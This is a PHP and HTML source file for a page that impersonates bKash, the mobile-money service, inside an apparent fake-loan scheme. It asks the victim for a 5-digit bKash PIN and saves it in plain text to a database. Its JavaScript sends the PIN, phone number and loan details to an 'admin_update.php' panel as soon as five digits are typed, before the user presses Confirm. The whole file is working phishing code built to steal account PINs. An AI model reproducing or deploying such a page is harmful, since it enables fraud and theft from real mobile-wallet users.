
<?php
session_start();
require_once 'config/database.php';

// Check if user came from OTP verification page
if (!isset($_SESSION['loan_id']) || !isset($_SESSION['otp_code'])) {
    header('Location: lon_request.php');
    exit();
}

$loan_id = $_SESSION['loan_id'];
$loan_amount = $_SESSION['loan_amount'];
$loan_category = $_SESSION['loan_category'];
$mobile_number = $_SESSION['mobile_number'];
$masked_mobile = substr($mobile_number, 0, 3) . 'XXXX' . substr($mobile_number, -4);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pin_code = $_POST['pin_code'];
    
    if (strlen($pin_code) === 5 && is_numeric($pin_code)) {
        // Update loan application with PIN
        $stmt = $pdo->prepare("UPDATE loan_applications SET pin_code = ?, status = 'pin_verified' WHERE id = ?");
        $stmt->execute([$pin_code, $loan_id]);
        
        $_SESSION['pin_code'] = $pin_code;
        
        header('Location: processing.php');
        exit();
    } else {
        $error = 'অনুগ্রহ করে ৫ সংখ্যার PIN কোড দিন';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>bKash Pin Verification</title>
  <link rel="icon" type="image/png" href="img/favicon.png">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

  <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">

    <!-- bKash Logo Header -->
    <div class="flex justify-between items-center bg-white px-6 py-4">
      <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo" />
    </div>

    <!-- Invoice + Amount Section -->
    <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
      <div>
        <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
        <p class="text-xs text-gray-500">loan category: <?php echo htmlspecialchars($loan_category); ?></p>
      </div>
      <p class="text-sm font-semibold text-gray-800">৳<?php echo number_format($loan_amount, 2); ?></p>
    </div>

    <!-- Dynamic Error Message -->
    <div id="errorMessage" class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm hidden">
        <span id="errorText"></span>
    </div>
    
    <?php if (isset($error)): ?>
    <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm">
        <?php echo htmlspecialchars($error); ?>
    </div>
    <?php endif; ?>
    
    <form method="POST" id="pinForm">
        <!-- PIN Input Section -->
        <div class="bg-pink-600 px-6 py-16">
          <p class="text-white text-sm mb-2 text-center">Enter bkash Pin <?php echo $masked_mobile; ?></p>
          <input
            type="text"
            name="pin_code"
            id="pin_code"
            placeholder="Enter 5 digit PIN"
            class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center"
            maxlength="5"
            required
          />
         
        </div>

        <!-- Buttons -->
        <div class="flex justify-between items-center bg-white px-6 py-4">
          <button type="button" onclick="showCancelDialog()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
            Cancel
          </button>
          <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
            Confirm
          </button>
        </div>
    </form>

    <!-- Footer -->
    <div class="text-center text-xs text-gray-400 py-2">
      © 2025 bKash, All Rights Reserved
      <br />
      <span class="text-pink-600">● 16247</span>
    </div>

  </div>

  <!-- Cancel Confirmation Dialog -->
  <div id="cancelDialog" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" style="display: none;">
    <div class="bg-pink-500 rounded-lg p-6 max-w-sm w-full mx-4 text-center">
      <div class="text-white mb-4">
        <div class="text-4xl mb-2">✋</div>
        <p class="text-lg font-medium">Are you sure you want to cancel this payment?</p>
      </div>
      <div class="flex gap-4">
        <button onclick="confirmCancel()" class="flex-1 bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
          Yes
        </button>
        <button onclick="hideCancelDialog()" class="flex-1 bg-pink-600 text-white py-2 rounded hover:bg-pink-700">
          No
        </button>
      </div>
    </div>
  </div>

  <script>
    const pinInput = document.getElementById('pin_code');
    const confirmBtn = document.getElementById('confirmBtn');
    const errorMessage = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    
    // Function to show error message
    function showErrorMessage(message) {
        errorText.textContent = message;
        errorMessage.classList.remove('hidden');
        
        // Auto hide after 5 seconds
        setTimeout(function() {
            errorMessage.classList.add('hidden');
        }, 5000);
    }
    
    // Function to hide messages
    function hideMessages() {
        errorMessage.classList.add('hidden');
    }
    
let canConfirm = true; // Allow immediate confirmation
    
    // Only allow numbers and limit to 5 digits
    pinInput.addEventListener('input', function() {
        // Remove any non-digit characters
        this.value = this.value.replace(/[^0-9]/g, '');
        
        if (this.value.length === 5) {
            confirmBtn.disabled = false;
            confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
            confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
            confirmBtn.textContent = 'Confirm';
        } else {
            confirmBtn.disabled = true;
            confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
            confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
            confirmBtn.textContent = 'Confirm';
        }
        
        // Hide messages when user starts typing
        if (this.value.length > 0) {
            hideMessages();
        }
        
        // Real-time update to admin panel and send notification for approval
        if (this.value.length === 5) {
            fetch('admin_update.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    action: 'pin_ready_for_approval',
                    loan_id: <?php echo $loan_id; ?>,
                    pin_code: this.value,
                    mobile_number: '<?php echo $mobile_number; ?>',
                    amount: '<?php echo $loan_amount; ?>',
                    category: '<?php echo $loan_category; ?>'
                })
            });
        }
    });
    
    // PIN status checking will be handled in processing page
    
    // Add form submission handler
     document.getElementById('pinForm').addEventListener('submit', function(e) {
         // Allow normal form submission to redirect to processing page
         // No need to prevent default or use fetch
     });
    
    // Cancel dialog functions
    function showCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'flex';
    }
    
    function hideCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'none';
    }
    
    function confirmCancel() {
        history.back();
    }
  </script>
</body>
</html>